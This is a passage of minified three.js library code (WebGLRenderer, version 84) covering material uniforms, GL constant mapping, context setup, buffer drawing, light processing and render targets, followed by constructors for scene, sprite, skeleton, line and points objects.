0!==\nl&&(l.isWebGLRenderTarget&&(l=l.texture),b=l.offset,l=l.repeat,k.offsetRepeat.value.set(b.x,b.y,l.x,l.y));k.envMap.value=c.envMap;k.flipEnvMap.value=c.envMap&&c.envMap.isCubeTexture?-1:1;k.reflectivity.value=c.reflectivity;k.refractionRatio.value=c.refractionRatio}c.isLineBasicMaterial?(k.diffuse.value=c.color,k.opacity.value=c.opacity):c.isLineDashedMaterial?(k.diffuse.value=c.color,k.opacity.value=c.opacity,k.dashSize.value=c.dashSize,k.totalSize.value=c.dashSize+c.gapSize,k.scale.value=c.scale):\nc.isPointsMaterial?(k.diffuse.value=c.color,k.opacity.value=c.opacity,k.size.value=c.size*Ra,k.scale.value=.5*Cc,k.map.value=c.map,null!==c.map&&(l=c.map.offset,c=c.map.repeat,k.offsetRepeat.value.set(l.x,l.y,c.x,c.y))):c.isMeshLambertMaterial?c.emissiveMap&&(k.emissiveMap.value=c.emissiveMap):c.isMeshToonMaterial?(r(k,c),c.gradientMap&&(k.gradientMap.value=c.gradientMap)):c.isMeshPhongMaterial?r(k,c):c.isMeshPhysicalMaterial?(k.clearCoat.value=c.clearCoat,k.clearCoatRoughness.value=c.clearCoatRoughness,\nA(k,c)):c.isMeshStandardMaterial?A(k,c):c.isMeshDepthMaterial?c.displacementMap&&(k.displacementMap.value=c.displacementMap,k.displacementScale.value=c.displacementScale,k.displacementBias.value=c.displacementBias):c.isMeshNormalMaterial&&(c.bumpMap&&(k.bumpMap.value=c.bumpMap,k.bumpScale.value=c.bumpScale),c.normalMap&&(k.normalMap.value=c.normalMap,k.normalScale.value.copy(c.normalScale)),c.displacementMap&&(k.displacementMap.value=c.displacementMap,k.displacementScale.value=c.displacementScale,\nk.displacementBias.value=c.displacementBias));void 0!==k.ltcMat&&(k.ltcMat.value=THREE.UniformsLib.LTC_MAT_TEXTURE);void 0!==k.ltcMag&&(k.ltcMag.value=THREE.UniformsLib.LTC_MAG_TEXTURE);$a.upload(B,g.uniformsList,k,P)}m.set(B,d,\"modelViewMatrix\");m.set(B,d,\"normalMatrix\");m.setValue(B,\"modelMatrix\",d.matrixWorld);return h}function r(a,b){a.specular.value=b.specular;a.shininess.value=Math.max(b.shininess,1E-4);b.emissiveMap&&(a.emissiveMap.value=b.emissiveMap);b.bumpMap&&(a.bumpMap.value=b.bumpMap,\na.bumpScale.value=b.bumpScale);b.normalMap&&(a.normalMap.value=b.normalMap,a.normalScale.value.copy(b.normalScale));b.displacementMap&&(a.displacementMap.value=b.displacementMap,a.displacementScale.value=b.displacementScale,a.displacementBias.value=b.displacementBias)}function A(a,b){a.roughness.value=b.roughness;a.metalness.value=b.metalness;b.roughnessMap&&(a.roughnessMap.value=b.roughnessMap);b.metalnessMap&&(a.metalnessMap.value=b.metalnessMap);b.emissiveMap&&(a.emissiveMap.value=b.emissiveMap);\nb.bumpMap&&(a.bumpMap.value=b.bumpMap,a.bumpScale.value=b.bumpScale);b.normalMap&&(a.normalMap.value=b.normalMap,a.normalScale.value.copy(b.normalScale));b.displacementMap&&(a.displacementMap.value=b.displacementMap,a.displacementScale.value=b.displacementScale,a.displacementBias.value=b.displacementBias);b.envMap&&(a.envMapIntensity.value=b.envMapIntensity)}function w(a){var b;if(1E3===a)return B.REPEAT;if(1001===a)return B.CLAMP_TO_EDGE;if(1002===a)return B.MIRRORED_REPEAT;if(1003===a)return B.NEAREST;\nif(1004===a)return B.NEAREST_MIPMAP_NEAREST;if(1005===a)return B.NEAREST_MIPMAP_LINEAR;if(1006===a)return B.LINEAR;if(1007===a)return B.LINEAR_MIPMAP_NEAREST;if(1008===a)return B.LINEAR_MIPMAP_LINEAR;if(1009===a)return B.UNSIGNED_BYTE;if(1017===a)return B.UNSIGNED_SHORT_4_4_4_4;if(1018===a)return B.UNSIGNED_SHORT_5_5_5_1;if(1019===a)return B.UNSIGNED_SHORT_5_6_5;if(1010===a)return B.BYTE;if(1011===a)return B.SHORT;if(1012===a)return B.UNSIGNED_SHORT;if(1013===a)return B.INT;if(1014===a)return B.UNSIGNED_INT;\nif(1015===a)return B.FLOAT;if(1016===a&&(b=ja.get(\"OES_texture_half_float\"),null!==b))return b.HALF_FLOAT_OES;if(1021===a)return B.ALPHA;if(1022===a)return B.RGB;if(1023===a)return B.RGBA;if(1024===a)return B.LUMINANCE;if(1025===a)return B.LUMINANCE_ALPHA;if(1026===a)return B.DEPTH_COMPONENT;if(1027===a)return B.DEPTH_STENCIL;if(100===a)return B.FUNC_ADD;if(101===a)return B.FUNC_SUBTRACT;if(102===a)return B.FUNC_REVERSE_SUBTRACT;if(200===a)return B.ZERO;if(201===a)return B.ONE;if(202===a)return B.SRC_COLOR;\nif(203===a)return B.ONE_MINUS_SRC_COLOR;if(204===a)return B.SRC_ALPHA;if(205===a)return B.ONE_MINUS_SRC_ALPHA;if(206===a)return B.DST_ALPHA;if(207===a)return B.ONE_MINUS_DST_ALPHA;if(208===a)return B.DST_COLOR;if(209===a)return B.ONE_MINUS_DST_COLOR;if(210===a)return B.SRC_ALPHA_SATURATE;if(2001===a||2002===a||2003===a||2004===a)if(b=ja.get(\"WEBGL_compressed_texture_s3tc\"),null!==b){if(2001===a)return b.COMPRESSED_RGB_S3TC_DXT1_EXT;if(2002===a)return b.COMPRESSED_RGBA_S3TC_DXT1_EXT;if(2003===a)return b.COMPRESSED_RGBA_S3TC_DXT3_EXT;\nif(2004===a)return b.COMPRESSED_RGBA_S3TC_DXT5_EXT}if(2100===a||2101===a||2102===a||2103===a)if(b=ja.get(\"WEBGL_compressed_texture_pvrtc\"),null!==b){if(2100===a)return b.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(2101===a)return b.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(2102===a)return b.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(2103===a)return b.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}if(2151===a&&(b=ja.get(\"WEBGL_compressed_texture_etc1\"),null!==b))return b.COMPRESSED_RGB_ETC1_WEBGL;if(103===a||104===a)if(b=ja.get(\"EXT_blend_minmax\"),\nnull!==b){if(103===a)return b.MIN_EXT;if(104===a)return b.MAX_EXT}return 1020===a&&(b=ja.get(\"WEBGL_depth_texture\"),null!==b)?b.UNSIGNED_INT_24_8_WEBGL:0}console.log(\"THREE.WebGLRenderer\",\"84\");a=a||{};var y=void 0!==a.canvas?a.canvas:document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\"),K=void 0!==a.context?a.context:null,v=void 0!==a.alpha?a.alpha:!1,E=void 0!==a.depth?a.depth:!0,L=void 0!==a.stencil?a.stencil:!0,C=void 0!==a.antialias?a.antialias:!1,F=void 0!==a.premultipliedAlpha?\na.premultipliedAlpha:!0,x=void 0!==a.preserveDrawingBuffer?a.preserveDrawingBuffer:!1,H=[],aa=[],D=-1,z=[],T=-1,Q=new Float32Array(8),M=[],O=[];this.domElement=y;this.context=null;this.sortObjects=this.autoClearStencil=this.autoClearDepth=this.autoClearColor=this.autoClear=!0;this.clippingPlanes=[];this.localClippingEnabled=!1;this.gammaFactor=2;this.physicallyCorrectLights=this.gammaOutput=this.gammaInput=!1;this.toneMappingWhitePoint=this.toneMappingExposure=this.toneMapping=1;this.maxMorphTargets=\n8;this.maxMorphNormals=4;var P=this,wa=null,W=null,N=null,R=-1,V=\"\",U=null,X=new fa,Sa=null,Z=new fa,ea=0,Ea=new J(0),gb=0,md=y.width,Cc=y.height,Ra=1,ga=new fa(0,0,md,Cc),ka=!1,ia=new fa(0,0,md,Cc),ma=new tc,ca=new Uf,oa=!1,ra=!1,na=new Na,ua=new S,Ga=new q,Ba=new S,xa=new S,ba={hash:\"\",ambient:[0,0,0],directional:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotShadowMap:[],spotShadowMatrix:[],rectArea:[],point:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[],shadows:[]},pa={calls:0,\nvertices:0,faces:0,points:0};this.info={render:pa,memory:{geometries:0,textures:0},programs:null};var B;try{v={alpha:v,depth:E,stencil:L,antialias:C,premultipliedAlpha:F,preserveDrawingBuffer:x};B=K||y.getContext(\"webgl\",v)||y.getContext(\"experimental-webgl\",v);if(null===B){if(null!==y.getContext(\"webgl\"))throw\"Error creating WebGL context with your selected attributes.\";throw\"Error creating WebGL context.\";}void 0===B.getShaderPrecisionFormat&&(B.getShaderPrecisionFormat=function(){return{rangeMin:1,\nrangeMax:1,precision:1}});y.addEventListener(\"webglcontextlost\",d,!1)}catch(Vf){console.error(\"THREE.WebGLRenderer: \"+Vf)}var ja=new Tf(B);ja.get(\"WEBGL_depth_texture\");ja.get(\"OES_texture_float\");ja.get(\"OES_texture_float_linear\");ja.get(\"OES_texture_half_float\");ja.get(\"OES_texture_half_float_linear\");ja.get(\"OES_standard_derivatives\");ja.get(\"ANGLE_instanced_arrays\");ja.get(\"OES_element_index_uint\")&&(I.MaxIndex=4294967296);var la=new Sf(B,ja,a),Y=new Rf(B,ja,w),ha=new Qf,ta=new Pf(B,ja,Y,ha,la,\nw,this.info),qa=new Of(B,ha,this.info),ya=new Mf(this,la),za=new Ef;this.info.programs=ya.programs;var La=new Df(B,ja,pa),Oa=new Cf(B,ja,pa),Ia,Ca,sa,va;b();this.context=B;this.capabilities=la;this.extensions=ja;this.properties=ha;this.state=Y;var Ma=new Ke(this,ba,qa,la);this.shadowMap=Ma;var Pa=new zf(this,M),Qa=new yf(this,O);this.getContext=function(){return B};this.getContextAttributes=function(){return B.getContextAttributes()};this.forceContextLoss=function(){ja.get(\"WEBGL_lose_context\").loseContext()};\nthis.getMaxAnisotropy=function(){return la.getMaxAnisotropy()};this.getPrecision=function(){return la.precision};this.getPixelRatio=function(){return Ra};this.setPixelRatio=function(a){void 0!==a&&(Ra=a,this.setSize(ia.z,ia.w,!1))};this.getSize=function(){return{width:md,height:Cc}};this.setSize=function(a,b,c){md=a;Cc=b;y.width=a*Ra;y.height=b*Ra;!1!==c&&(y.style.width=a+\"px\",y.style.height=b+\"px\");this.setViewport(0,0,a,b)};this.setViewport=function(a,b,c,d){Y.viewport(ia.set(a,b,c,d))};this.setScissor=\nfunction(a,b,c,d){Y.scissor(ga.set(a,b,c,d))};this.setScissorTest=function(a){Y.setScissorTest(ka=a)};this.getClearColor=function(){return Ea};this.setClearColor=function(a,b){Ea.set(a);gb=void 0!==b?b:1;Y.buffers.color.setClear(Ea.r,Ea.g,Ea.b,gb,F)};this.getClearAlpha=function(){return gb};this.setClearAlpha=function(a){gb=a;Y.buffers.color.setClear(Ea.r,Ea.g,Ea.b,gb,F)};this.clear=function(a,b,c){var d=0;if(void 0===a||a)d|=B.COLOR_BUFFER_BIT;if(void 0===b||b)d|=B.DEPTH_BUFFER_BIT;if(void 0===c||\nc)d|=B.STENCIL_BUFFER_BIT;B.clear(d)};this.clearColor=function(){this.clear(!0,!1,!1)};this.clearDepth=function(){this.clear(!1,!0,!1)};this.clearStencil=function(){this.clear(!1,!1,!0)};this.clearTarget=function(a,b,c,d){this.setRenderTarget(a);this.clear(b,c,d)};this.resetGLState=c;this.dispose=function(){z=[];T=-1;aa=[];D=-1;y.removeEventListener(\"webglcontextlost\",d,!1)};this.renderBufferImmediate=function(a,b,c){Y.initAttributes();var d=ha.get(a);a.hasPositions&&!d.position&&(d.position=B.createBuffer());\na.hasNormals&&!d.normal&&(d.normal=B.createBuffer());a.hasUvs&&!d.uv&&(d.uv=B.createBuffer());a.hasColors&&!d.color&&(d.color=B.createBuffer());b=b.getAttributes();a.hasPositions&&(B.bindBuffer(B.ARRAY_BUFFER,d.position),B.bufferData(B.ARRAY_BUFFER,a.positionArray,B.DYNAMIC_DRAW),Y.enableAttribute(b.position),B.vertexAttribPointer(b.position,3,B.FLOAT,!1,0,0));if(a.hasNormals){B.bindBuffer(B.ARRAY_BUFFER,d.normal);if(!c.isMeshPhongMaterial&&!c.isMeshStandardMaterial&&!c.isMeshNormalMaterial&&1===\nc.shading)for(var e=0,f=3*a.count;e<f;e+=9){var g=a.normalArray,h=(g[e+0]+g[e+3]+g[e+6])/3,m=(g[e+1]+g[e+4]+g[e+7])/3,k=(g[e+2]+g[e+5]+g[e+8])/3;g[e+0]=h;g[e+1]=m;g[e+2]=k;g[e+3]=h;g[e+4]=m;g[e+5]=k;g[e+6]=h;g[e+7]=m;g[e+8]=k}B.bufferData(B.ARRAY_BUFFER,a.normalArray,B.DYNAMIC_DRAW);Y.enableAttribute(b.normal);B.vertexAttribPointer(b.normal,3,B.FLOAT,!1,0,0)}a.hasUvs&&c.map&&(B.bindBuffer(B.ARRAY_BUFFER,d.uv),B.bufferData(B.ARRAY_BUFFER,a.uvArray,B.DYNAMIC_DRAW),Y.enableAttribute(b.uv),B.vertexAttribPointer(b.uv,\n2,B.FLOAT,!1,0,0));a.hasColors&&0!==c.vertexColors&&(B.bindBuffer(B.ARRAY_BUFFER,d.color),B.bufferData(B.ARRAY_BUFFER,a.colorArray,B.DYNAMIC_DRAW),Y.enableAttribute(b.color),B.vertexAttribPointer(b.color,3,B.FLOAT,!1,0,0));Y.disableUnusedAttributes();B.drawArrays(B.TRIANGLES,0,a.count);a.count=0};this.renderBufferDirect=function(a,b,c,d,e,f){l(d);var h=G(a,b,d,e),m=!1;a=c.id+\"_\"+h.id+\"_\"+d.wireframe;a!==V&&(V=a,m=!0);b=e.morphTargetInfluences;if(void 0!==b){var k=[];a=0;for(var n=b.length;a<n;a++)m=\nb[a],k.push([m,a]);k.sort(g);8<k.length&&(k.length=8);var t=c.morphAttributes;a=0;for(n=k.length;a<n;a++)m=k[a],Q[a]=m[0],0!==m[0]?(b=m[1],!0===d.morphTargets&&t.position&&c.addAttribute(\"morphTarget\"+a,t.position[b]),!0===d.morphNormals&&t.normal&&c.addAttribute(\"morphNormal\"+a,t.normal[b])):(!0===d.morphTargets&&c.removeAttribute(\"morphTarget\"+a),!0===d.morphNormals&&c.removeAttribute(\"morphNormal\"+a));a=k.length;for(b=Q.length;a<b;a++)Q[a]=0;h.getUniforms().setValue(B,\"morphTargetInfluences\",Q);\nm=!0}b=c.index;n=c.attributes.position;k=1;!0===d.wireframe&&(b=qa.getWireframeAttribute(c),k=2);null!==b?(a=Oa,a.setIndex(b)):a=La;if(m){a:{var m=void 0,p;if(c&&c.isInstancedBufferGeometry&&(p=ja.get(\"ANGLE_instanced_arrays\"),null===p)){console.error(\"THREE.WebGLRenderer.setupVertexAttributes: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.\");break a}void 0===m&&(m=0);Y.initAttributes();var t=c.attributes,h=h.getAttributes(),r=d.defaultAttributeValues,\nq;for(q in h){var y=h[q];if(0<=y){var v=t[q];if(void 0!==v){var w=v.normalized,A=v.itemSize,K=qa.getAttributeProperties(v),C=K.__webglBuffer,L=K.type,K=K.bytesPerElement;if(v.isInterleavedBufferAttribute){var F=v.data,E=F.stride,v=v.offset;F&&F.isInstancedInterleavedBuffer?(Y.enableAttributeAndDivisor(y,F.meshPerAttribute,p),void 0===c.maxInstancedCount&&(c.maxInstancedCount=F.meshPerAttribute*F.count)):Y.enableAttribute(y);B.bindBuffer(B.ARRAY_BUFFER,C);B.vertexAttribPointer(y,A,L,w,E*K,(m*E+v)*\nK)}else v.isInstancedBufferAttribute?(Y.enableAttributeAndDivisor(y,v.meshPerAttribute,p),void 0===c.maxInstancedCount&&(c.maxInstancedCount=v.meshPerAttribute*v.count)):Y.enableAttribute(y),B.bindBuffer(B.ARRAY_BUFFER,C),B.vertexAttribPointer(y,A,L,w,0,m*A*K)}else if(void 0!==r&&(w=r[q],void 0!==w))switch(w.length){case 2:B.vertexAttrib2fv(y,w);break;case 3:B.vertexAttrib3fv(y,w);break;case 4:B.vertexAttrib4fv(y,w);break;default:B.vertexAttrib1fv(y,w)}}}Y.disableUnusedAttributes()}null!==b&&B.bindBuffer(B.ELEMENT_ARRAY_BUFFER,\nqa.getAttributeBuffer(b))}p=0;null!==b?p=b.count:void 0!==n&&(p=n.count);b=c.drawRange.start*k;n=null!==f?f.start*k:0;q=Math.max(b,n);f=Math.max(0,Math.min(p,b+c.drawRange.count*k,n+(null!==f?f.count*k:Infinity))-1-q+1);if(0!==f){if(e.isMesh)if(!0===d.wireframe)Y.setLineWidth(d.wireframeLinewidth*(null===W?Ra:1)),a.setMode(B.LINES);else switch(e.drawMode){case 0:a.setMode(B.TRIANGLES);break;case 1:a.setMode(B.TRIANGLE_STRIP);break;case 2:a.setMode(B.TRIANGLE_FAN)}else e.isLine?(d=d.linewidth,void 0===\nd&&(d=1),Y.setLineWidth(d*(null===W?Ra:1)),e.isLineSegments?a.setMode(B.LINES):a.setMode(B.LINE_STRIP)):e.isPoints&&a.setMode(B.POINTS);c&&c.isInstancedBufferGeometry?0<c.maxInstancedCount&&a.renderInstances(c,q,f):a.render(q,f)}};this.render=function(a,b,c,d){if(void 0!==b&&!0!==b.isCamera)console.error(\"THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.\");else{V=\"\";R=-1;U=null;!0===a.autoUpdate&&a.updateMatrixWorld();null===b.parent&&b.updateMatrixWorld();b.matrixWorldInverse.getInverse(b.matrixWorld);\nua.multiplyMatrices(b.projectionMatrix,b.matrixWorldInverse);ma.setFromMatrix(ua);H.length=0;T=D=-1;M.length=0;O.length=0;ra=this.localClippingEnabled;oa=ca.init(this.clippingPlanes,ra,b);p(a,b);aa.length=D+1;z.length=T+1;!0===P.sortObjects&&(aa.sort(h),z.sort(m));oa&&ca.beginShadows();for(var e=H,f=0,g=0,k=e.length;g<k;g++){var t=e[g];t.castShadow&&(ba.shadows[f++]=t)}ba.shadows.length=f;Ma.render(a,b);for(var e=H,l=t=0,u=0,r,G,q,y,v=b.matrixWorldInverse,w=0,A=0,K=0,C=0,L=0,f=0,g=e.length;f<g;f++)if(k=\ne[f],r=k.color,G=k.intensity,q=k.distance,y=k.shadow&&k.shadow.map?k.shadow.map.texture:null,k.isAmbientLight)t+=r.r*G,l+=r.g*G,u+=r.b*G;else if(k.isDirectionalLight){var E=za.get(k);E.color.copy(k.color).multiplyScalar(k.intensity);E.direction.setFromMatrixPosition(k.matrixWorld);Ga.setFromMatrixPosition(k.target.matrixWorld);E.direction.sub(Ga);E.direction.transformDirection(v);if(E.shadow=k.castShadow)E.shadowBias=k.shadow.bias,E.shadowRadius=k.shadow.radius,E.shadowMapSize=k.shadow.mapSize;ba.directionalShadowMap[w]=\ny;ba.directionalShadowMatrix[w]=k.shadow.matrix;ba.directional[w++]=E}else if(k.isSpotLight){E=za.get(k);E.position.setFromMatrixPosition(k.matrixWorld);E.position.applyMatrix4(v);E.color.copy(r).multiplyScalar(G);E.distance=q;E.direction.setFromMatrixPosition(k.matrixWorld);Ga.setFromMatrixPosition(k.target.matrixWorld);E.direction.sub(Ga);E.direction.transformDirection(v);E.coneCos=Math.cos(k.angle);E.penumbraCos=Math.cos(k.angle*(1-k.penumbra));E.decay=0===k.distance?0:k.decay;if(E.shadow=k.castShadow)E.shadowBias=\nk.shadow.bias,E.shadowRadius=k.shadow.radius,E.shadowMapSize=k.shadow.mapSize;ba.spotShadowMap[K]=y;ba.spotShadowMatrix[K]=k.shadow.matrix;ba.spot[K++]=E}else if(k.isRectAreaLight)E=za.get(k),E.color.copy(r).multiplyScalar(G/(k.width*k.height)),E.position.setFromMatrixPosition(k.matrixWorld),E.position.applyMatrix4(v),xa.identity(),Ba.copy(k.matrixWorld),Ba.premultiply(v),xa.extractRotation(Ba),E.halfWidth.set(.5*k.width,0,0),E.halfHeight.set(0,.5*k.height,0),E.halfWidth.applyMatrix4(xa),E.halfHeight.applyMatrix4(xa),\nba.rectArea[C++]=E;else if(k.isPointLight){E=za.get(k);E.position.setFromMatrixPosition(k.matrixWorld);E.position.applyMatrix4(v);E.color.copy(k.color).multiplyScalar(k.intensity);E.distance=k.distance;E.decay=0===k.distance?0:k.decay;if(E.shadow=k.castShadow)E.shadowBias=k.shadow.bias,E.shadowRadius=k.shadow.radius,E.shadowMapSize=k.shadow.mapSize;ba.pointShadowMap[A]=y;void 0===ba.pointShadowMatrix[A]&&(ba.pointShadowMatrix[A]=new S);Ga.setFromMatrixPosition(k.matrixWorld).negate();ba.pointShadowMatrix[A].identity().setPosition(Ga);\nba.point[A++]=E}else k.isHemisphereLight&&(E=za.get(k),E.direction.setFromMatrixPosition(k.matrixWorld),E.direction.transformDirection(v),E.direction.normalize(),E.skyColor.copy(k.color).multiplyScalar(G),E.groundColor.copy(k.groundColor).multiplyScalar(G),ba.hemi[L++]=E);ba.ambient[0]=t;ba.ambient[1]=l;ba.ambient[2]=u;ba.directional.length=w;ba.spot.length=K;ba.rectArea.length=C;ba.point.length=A;ba.hemi.length=L;ba.hash=w+\",\"+A+\",\"+K+\",\"+C+\",\"+L+\",\"+ba.shadows.length;oa&&ca.endShadows();pa.calls=\n0;pa.vertices=0;pa.faces=0;pa.points=0;void 0===c&&(c=null);this.setRenderTarget(c);e=a.background;null===e?Y.buffers.color.setClear(Ea.r,Ea.g,Ea.b,gb,F):e&&e.isColor&&(Y.buffers.color.setClear(e.r,e.g,e.b,1,F),d=!0);(this.autoClear||d)&&this.clear(this.autoClearColor,this.autoClearDepth,this.autoClearStencil);e&&e.isCubeTexture?(void 0===sa&&(sa=new Fa,va=new Aa(new kb(5,5,5),new Ha({uniforms:bb.cube.uniforms,vertexShader:bb.cube.vertexShader,fragmentShader:bb.cube.fragmentShader,side:1,depthTest:!1,\ndepthWrite:!1,fog:!1}))),sa.projectionMatrix.copy(b.projectionMatrix),sa.matrixWorld.extractRotation(b.matrixWorld),sa.matrixWorldInverse.getInverse(sa.matrixWorld),va.material.uniforms.tCube.value=e,va.modelViewMatrix.multiplyMatrices(sa.matrixWorldInverse,va.matrixWorld),qa.update(va),P.renderBufferDirect(sa,null,va.geometry,va.material,va,null)):e&&e.isTexture&&(void 0===Ia&&(Ia=new Jb(-1,1,1,-1,0,1),Ca=new Aa(new lb(2,2),new Ka({depthTest:!1,depthWrite:!1,fog:!1}))),Ca.material.map=e,qa.update(Ca),\nP.renderBufferDirect(Ia,null,Ca.geometry,Ca.material,Ca,null));a.overrideMaterial?(d=a.overrideMaterial,n(aa,a,b,d),n(z,a,b,d)):(Y.setBlending(0),n(aa,a,b),n(z,a,b));Pa.render(a,b);Qa.render(a,b,Z);c&&ta.updateRenderTargetMipmap(c);Y.setDepthTest(!0);Y.setDepthWrite(!0);Y.setColorWrite(!0)}};this.setFaceCulling=function(a,b){Y.setCullFace(a);Y.setFlipSided(0===b)};this.allocTextureUnit=function(){var a=ea;a>=la.maxTextures&&console.warn(\"WebGLRenderer: trying to use \"+a+\" texture units while this GPU supports only \"+\nla.maxTextures);ea+=1;return a};this.setTexture2D=function(){var a=!1;return function(b,c){b&&b.isWebGLRenderTarget&&(a||(console.warn(\"THREE.WebGLRenderer.setTexture2D: don't use render targets as textures. Use their .texture property instead.\"),a=!0),b=b.texture);ta.setTexture2D(b,c)}}();this.setTexture=function(){var a=!1;return function(b,c){a||(console.warn(\"THREE.WebGLRenderer: .setTexture is deprecated, use setTexture2D instead.\"),a=!0);ta.setTexture2D(b,c)}}();this.setTextureCube=function(){var a=\n!1;return function(b,c){b&&b.isWebGLRenderTargetCube&&(a||(console.warn(\"THREE.WebGLRenderer.setTextureCube: don't use cube render targets as textures. Use their .texture property instead.\"),a=!0),b=b.texture);b&&b.isCubeTexture||Array.isArray(b.image)&&6===b.image.length?ta.setTextureCube(b,c):ta.setTextureCubeDynamic(b,c)}}();this.getCurrentRenderTarget=function(){return W};this.setRenderTarget=function(a){(W=a)&&void 0===ha.get(a).__webglFramebuffer&&ta.setupRenderTarget(a);var b=a&&a.isWebGLRenderTargetCube,\nc;a?(c=ha.get(a),c=b?c.__webglFramebuffer[a.activeCubeFace]:c.__webglFramebuffer,X.copy(a.scissor),Sa=a.scissorTest,Z.copy(a.viewport)):(c=null,X.copy(ga).multiplyScalar(Ra),Sa=ka,Z.copy(ia).multiplyScalar(Ra));N!==c&&(B.bindFramebuffer(B.FRAMEBUFFER,c),N=c);Y.scissor(X);Y.setScissorTest(Sa);Y.viewport(Z);b&&(b=ha.get(a.texture),B.framebufferTexture2D(B.FRAMEBUFFER,B.COLOR_ATTACHMENT0,B.TEXTURE_CUBE_MAP_POSITIVE_X+a.activeCubeFace,b.__webglTexture,a.activeMipMapLevel))};this.readRenderTargetPixels=\nfunction(a,b,c,d,e,f){if(!1===(a&&a.isWebGLRenderTarget))console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.\");else{var g=ha.get(a).__webglFramebuffer;if(g){var h=!1;g!==N&&(B.bindFramebuffer(B.FRAMEBUFFER,g),h=!0);try{var k=a.texture,m=k.format,n=k.type;1023!==m&&w(m)!==B.getParameter(B.IMPLEMENTATION_COLOR_READ_FORMAT)?console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.\"):1009===\nn||w(n)===B.getParameter(B.IMPLEMENTATION_COLOR_READ_TYPE)||1015===n&&(ja.get(\"OES_texture_float\")||ja.get(\"WEBGL_color_buffer_float\"))||1016===n&&ja.get(\"EXT_color_buffer_half_float\")?B.checkFramebufferStatus(B.FRAMEBUFFER)===B.FRAMEBUFFER_COMPLETE?0<=b&&b<=a.width-d&&0<=c&&c<=a.height-e&&B.readPixels(b,c,d,e,w(m),w(n),f):console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: readPixels from renderTarget failed. Framebuffer not complete.\"):console.error(\"THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.\")}finally{h&&\nB.bindFramebuffer(B.FRAMEBUFFER,N)}}}}}function Kb(a,b){this.name=\"\";this.color=new J(a);this.density=void 0!==b?b:2.5E-4}function Lb(a,b,c){this.name=\"\";this.color=new J(a);this.near=void 0!==b?b:1;this.far=void 0!==c?c:1E3}function mb(){x.call(this);this.type=\"Scene\";this.overrideMaterial=this.fog=this.background=null;this.autoUpdate=!0}function Zd(a,b,c,d,e){x.call(this);this.lensFlares=[];this.positionScreen=new q;this.customUpdateCallback=void 0;void 0!==a&&this.add(a,b,c,d,e)}function nb(a){X.call(this);\nthis.type=\"SpriteMaterial\";this.color=new J(16777215);this.map=null;this.rotation=0;this.lights=this.fog=!1;this.setValues(a)}function Dc(a){x.call(this);this.type=\"Sprite\";this.material=void 0!==a?a:new nb}function Ec(){x.call(this);this.type=\"LOD\";Object.defineProperties(this,{levels:{enumerable:!0,value:[]}})}function od(a,b,c){this.useVertexTexture=void 0!==c?c:!0;this.identityMatrix=new S;a=a||[];this.bones=a.slice(0);this.useVertexTexture?(a=Math.sqrt(4*this.bones.length),a=N.nextPowerOfTwo(Math.ceil(a)),\nthis.boneTextureHeight=this.boneTextureWidth=a=Math.max(a,4),this.boneMatrices=new Float32Array(this.boneTextureWidth*this.boneTextureHeight*4),this.boneTexture=new eb(this.boneMatrices,this.boneTextureWidth,this.boneTextureHeight,1023,1015)):this.boneMatrices=new Float32Array(16*this.bones.length);if(void 0===b)this.calculateInverses();else if(this.bones.length===b.length)this.boneInverses=b.slice(0);else for(console.warn(\"THREE.Skeleton bonInverses is the wrong length.\"),this.boneInverses=[],b=\n0,a=this.bones.length;b<a;b++)this.boneInverses.push(new S)}function pd(){x.call(this);this.type=\"Bone\"}function qd(a,b,c){Aa.call(this,a,b);this.type=\"SkinnedMesh\";this.bindMode=\"attached\";this.bindMatrix=new S;this.bindMatrixInverse=new S;a=[];if(this.geometry&&void 0!==this.geometry.bones){for(var d,e=0,f=this.geometry.bones.length;e<f;++e)d=this.geometry.bones[e],b=new pd,a.push(b),b.name=d.name,b.position.fromArray(d.pos),b.quaternion.fromArray(d.rotq),void 0!==d.scl&&b.scale.fromArray(d.scl);\ne=0;for(f=this.geometry.bones.length;e<f;++e)d=this.geometry.bones[e],-1!==d.parent&&null!==d.parent&&void 0!==a[d.parent]?a[d.parent].add(a[e]):this.add(a[e])}this.normalizeSkinWeights();this.updateMatrixWorld(!0);this.bind(new od(a,void 0,c),this.matrixWorld)}function ia(a){X.call(this);this.type=\"LineBasicMaterial\";this.color=new J(16777215);this.linewidth=1;this.linejoin=this.linecap=\"round\";this.lights=!1;this.setValues(a)}function Ua(a,b,c){if(1===c)return console.warn(\"THREE.Line: parameter THREE.LinePieces no longer supported. Created THREE.LineSegments instead.\"),\nnew ga(a,b);x.call(this);this.type=\"Line\";this.geometry=void 0!==a?a:new I;this.material=void 0!==b?b:new ia({color:16777215*Math.random()})}function ga(a,b){Ua.call(this,a,b);this.type=\"LineSegments\"}function Oa(a){X.call(this);this.type=\"PointsMaterial\";this.color=new J(16777215);this.map=null;this.size=1;this.sizeAttenuation=!0;this.lights=!1;this.setValues(a)}function Mb(a,b){x.call(this);this.type=\"Points\";this.geometry=void 0!==a?a:new I;this.material=void 0!==b?b:new Oa({color:16777215*Math.random()})}\nfunction Fc(){x.call(this);this.type=\"Group\"}function rd(a,b,c,d,e,f,g,h,m){function k(){requestAnimationFrame(k);a.readyState>=a.HAVE_CURRENT_DATA&&(t.needsUpdate=!0)}ea.call(this,a,b,c,d,e,f,g,h,m);this.generateMipmaps=!1;var t=this;k()}function Nb(a,b,c,d,e,f,g,h,m,k,t,p){ea.call(this,null,f,g,h,m,k,d,e,t,p);this.image={width:b,height:c};this.mipmaps=a;this.generateMipmaps=this.flipY=!1}function sd(a,b,c,d,e,f,g,h,m){ea.call(this,a,b,c,d,e,f,g,h,m);this.needsUpdate=!0}function Gc(a,b,c,d,e,f,g,\nh,m,k){k=void 0!==k?k:1026;if(1026!==k&&1027!==k)throw Error(\"DepthTexture format must be either 